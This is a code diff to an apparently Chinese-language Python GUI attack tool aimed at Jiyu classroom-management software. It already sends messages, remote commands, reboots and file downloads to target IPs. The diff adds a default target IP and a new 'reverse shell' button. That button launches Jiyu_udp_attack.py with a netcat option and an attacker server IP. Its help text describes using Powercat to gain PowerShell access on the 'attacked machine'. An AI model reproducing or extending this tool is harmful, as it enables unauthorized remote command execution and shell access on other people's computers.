@@ -7,6 +7,7 @@ from shell_debug import CommandLineWidget as clw #命令行窗口
 import hashlib as Hash #哈希加密
 import time #计时
 import os
+import subprocess
 
 '''资源路径处理函数，用于打包后访问文件'''
 def resource_path(relative_path):
@@ -28,6 +29,8 @@ task_lock = threading.Lock()
 short_password = '47528fde188a75581be3a3242354512f' #短期密码
 
 have_error = False
+
+ip = "N"
 
 #ip查询功能 - 读取ip_address.txt
 try:
@@ -102,9 +105,14 @@ def settings():
         Jiyu.args.t = int(input())
         print("请设置发送端口(一般无需修改，填4705即可，乱改可能会导致消息无法发送!),你的上一次设置: "+str(Jiyu.args.p)+" 端口")
         Jiyu.args.p = int(input())
+        print("需要设置IP默认填充吗?(即自动填充ip地址,不询问;若需要,请输入IP地址,不需要,请输入N)")
+        global ip
+        ip = input()
         print("设置完成,新的设置已经生效:")
         print("循环时间间隔: "+str(Jiyu.args.t)+"秒")
         print("发送端口: "+str(Jiyu.args.p)+" 端口")
+        if ip != "N":
+            print("默认Ip: "+ip)
         print("-------------------------------------------------------")
         print(">>> ")
     # 使用 start_task 启动任务
@@ -130,10 +138,15 @@ def send_message():
     def task():
         Jiyu.args.c = None #先清除command属性，防止误发送
         Jiyu.args.msg = None #先清除msg属性，防止误发送
-        print("\n\n请输入目标ip地址:")
-        ip_addr = input()
-        Jiyu.args.ip = ip_addr
-        time.sleep(0.05)#防止输出乱序
+        if ip == "N":
+            print("\n\n请输入目标ip地址:")
+            ip_addr = input()
+            Jiyu.args.ip = ip_addr
+            time.sleep(0.05)#防止输出乱序
+        else:
+            ip_addr = ip
+            Jiyu.args.ip = ip_addr
+            time.sleep(0.05)#防止输出乱序
         print("请输入要发送的内容:")
         msg = '"'+input()+'"'
         Jiyu.args.msg = msg
@@ -170,12 +183,21 @@ def send_command():
         truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688' #长期密码
         if truly_password == password or short_password == password:
             app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
             Jiyu.args.c = None #先清除command属性，防止误发送
             Jiyu.args.msg = None #先清除msg属性，防止误发送
-            print("\n\n请输入目标ip地址:")
-            ip_addr = input()
-            Jiyu.args.ip = ip_addr
-            time.sleep(0.05)#防止输出乱序
+            if ip == "N":
+                print("\n\n请输入目标ip地址:")
+                ip_addr = input()
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
+            else:
+                ip_addr = ip
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
             print("请输入要执行的命令:")
             cmd = '"'+input()+'"'
             Jiyu.args.c = cmd
@@ -185,7 +207,7 @@ def send_command():
             Range = int(input())
             Jiyu.args.l = Range
             time.sleep(0.05)#防止输出乱序
-            print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的命令是:  "+cmd+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
+            print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的命令是:  "+Jiyu.args.c+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
             print("是否正确？(正确请输入T)")
             answer = input()
             if answer == "T":
@@ -216,10 +238,19 @@ def reboot():
         truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
         if truly_password == password or short_password == password:
             app.cli._clear_output()#清空输入
-            print("\n\n请输入目标ip地址:")
-            ip_addr = input()
-            Jiyu.args.ip = ip_addr
-            time.sleep(0.05)#防止输出乱序
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            if ip == "N":
+                print("\n\n请输入目标ip地址:")
+                ip_addr = input()
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
+            else:
+                ip_addr = ip
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
             answer = input("你将向ip地址为 "+ip_addr+" 的主机发送重启指令,确认请输入T\n")
             if answer == "T":
                 answer = "F"
@@ -256,10 +287,19 @@ def file_download():
         truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
         if truly_password == password or short_password == password:
             app.cli._clear_output()#清空输入
-            print("\n\n请输入目标ip地址:")
-            ip_addr = input()
-            Jiyu.args.ip = ip_addr
-            time.sleep(0.05)#防止输出乱序
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            app.cli._clear_output()#清空输入
+            if ip == "N":
+                print("\n\n请输入目标ip地址:")
+                ip_addr = input()
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
+            else:
+                ip_addr = ip
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
             print("请输入文件的链接:")
             url = input()
             url_backup = url
@@ -365,6 +405,15 @@ def help_list():
     print("\n2-8.ip查询")
     print("查询一些已经知道的ip地址")
     print("注意:需要在程序同一目录下放一个ip_address.txt文件,否则无法读取!")
+
+    print("\n2-9.反弹Shell")
+    print("通过Powercat指令反弹shell,获得对方的powershell权限")
+    print("输入要求:")
+    print("(0).密码:为了防止恶意用户滥用部分影响较大的功能,需要输入开发者密码(临时密码不可用)")
+    print("(1).ip地址(被攻击机):形如192.168.110.1的地址,这个请自己找,这里不再赘述ip地址的相关知识")
+    print("(2).本机的服务器ip:攻击机上的一个服务器,请执行文件夹中的test.exe(必须使用8000端口)")
+    print("之后,将弹出一个powershell窗口(若起始位置是C:\\Windows\\System32文件夹,说明反弹Shell成功)")
+    print("注意:此窗口不支持中文")
     
 
     print("\n\n3.命令行指令")
@@ -376,6 +425,8 @@ def help_list():
     print("test      测试命令行的输出功能")
     print("inputtest 测试命令行的输入功能")
     print("history   显示输入过的命令(清空输出后这里也会清空)")
+    print("exit      关闭当前窗口")
+    print("args      调试用指令,显示Jiyu所支持的命令行参数及其内容")
 
     print(">>> ")
 
@@ -391,6 +442,59 @@ def ip_list_search():
         i = i.replace("\n", "")
         print(i)
     print(">>> ")
+
+#反弹Shell功能
+def GET_Shell():
+    def task():
+        Jiyu.args.c = None
+        Jiyu.args.msg = None
+        password = input("此为开发者专用功能,请输入密码:")
+        password = password.encode()
+        password = Hash.md5(password).hexdigest()
+        truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
+        if truly_password == password:
+            app.cli._clear_output()
+            # 清空五次（原代码逻辑）
+            for _ in range(5):
+                app.cli._clear_output()
+            
+            if ip == "N":
+                print("\n\n请输入目标ip地址:")
+                ip_addr = input()
+                time.sleep(0.05)
+            else:
+                ip_addr = ip
+                time.sleep(0.05)
+            
+            print("请确认文件分发服务器是否运行!")
+            print("请输入文件服务器运行ip!")
+            server_ip = input()
+            time.sleep(0.05)
+            
+            # 构建命令行参数
+            script_path = os.path.join(os.path.dirname(__file__), 'Jiyu_udp_attack.py')
+            cmd = [
+                'python', script_path,
+                '-ip', ip_addr,
+                '-lip', server_ip,
+                '-e', 'nc'
+            ]
+            
+            print("\n------------------------------------")
+            print("你的目标ip地址是:    "+ip_addr)
+            print("准备在新窗口中运行攻击脚本...")
+            print("------------------------------------\n")
+            
+            # 启动新进程（不等待，独立窗口）
+            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
+            
+            print("攻击脚本已在独立窗口中运行，请关注该窗口。")
+            print(">>> ")
+        else:
+            print("密码错误")
+            time.sleep(0.05)
+            app.cli._append_output(">>> ")
+    start_task(task)
 
 
 #窗口设置
@@ -435,6 +539,11 @@ action_buttons.append(help_btn)
 ip_list_btn = ctk.CTkButton(app, text="ip查询", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=ip_list_search)
 ip_list_btn.place(x=800, y=470)
 action_buttons.append(ip_list_btn)
+
+Shell_btn = ctk.CTkButton(app, text="反弹Shell", font=("Microsoft YaHei UI", 16), fg_color="#32CD32", hover_color="#228B22", text_color="#FF6347", command=GET_Shell)
+Shell_btn.place(x=800, y=520)
+action_buttons.append(Shell_btn)
+
 
 #嵌入命令行窗口
 app.cli = clw(app, width=800, height=450)
